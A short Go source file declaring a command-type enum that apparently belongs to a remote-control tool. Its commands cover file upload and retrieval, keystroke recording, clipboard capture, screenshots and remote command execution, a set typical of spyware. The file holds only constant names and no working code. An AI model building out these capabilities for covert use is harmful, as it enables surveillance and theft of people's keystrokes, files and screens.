package definition

type CmdType int

const (
	UploadFile = iota
	GetFileContent
	KeyboardRecordToFile
	KeyboardRecordListen
	GetClipboardText
	ExecuteCommand
	GetScreenshot
	TestUpload
	Confirm
	Reset
)
